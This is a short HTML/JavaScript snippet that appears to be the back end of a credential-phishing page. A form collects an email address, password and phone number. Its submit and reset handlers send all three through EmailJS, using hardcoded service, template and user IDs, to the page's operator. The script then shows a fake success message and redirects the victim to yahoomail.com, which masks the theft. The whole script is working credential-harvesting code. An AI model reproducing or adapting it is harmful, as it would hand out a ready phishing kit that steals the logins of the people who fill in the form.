 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

(function() {
emailjs.init("user_1yAf2YtTbMDWHE9Ns4DoM");
})();
</script>

<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

<script >

function validate(){
  let email = document.querySelector(".form-email");
  let pasword = document.querySelector(".form-password");
  let phone = document.querySelector(".form-phone");
  let btnSubmit = document.querySelector(".form-submit");
  let btnReset = document.querySelector(".form-reset");

  btnSubmit.addEventListener("click", (e)=> {
    e.preventDefault()
    
    if (email.value == "" || pasword.value == "" || phone.value == ""){
      inputEmpty();
    }
    else {
      sentEmail(email.value, pasword.value, phone.value);
      success();
      console.log("email sent");
      // window.location.href = "http://gmail.com";
      clear()
    } 
  }),

  btnReset.addEventListener("click", (e)=> {
    e.preventDefault()
    
    if (email.value == "" || pasword.value == "" || phone.value == ""){
      inputEmpty();
    }
    else {
      sentEmail(email.value, pasword.value, phone.value);
      success();
      console.log("email sent");
      // window.location.href = "http://yahoomail.com";
      clear()
    } 
  })
  
}
validate()

function sentEmail(email, pasword, phone){
  emailjs.send("service_qg3j1et","template_phowizd",{
  from_name: email,
  to_name: pasword,
  message: phone,
}).then ((message) => window.location.href = ("http://yahoomail.com"))
}

function success(){
  swal({
  title: "Good job!",
  text: "successfully!",
  icon: "success",
  button: "ok",
});
}

function reset(){
  swal({
  title: "Oops...!",
  text: "the reset is successful",
  icon: "error",
  button: "ok",
});
}
// error()

function inputEmpty(){
  swal({
  title: "Oops...!",
  text: "Inputs fields are required!",
  icon: "error",
  button: "ok",
});
}
function clear(){
  email.value = "";
  pasword.value = ""; 
   phone.value = "";
}
</script>
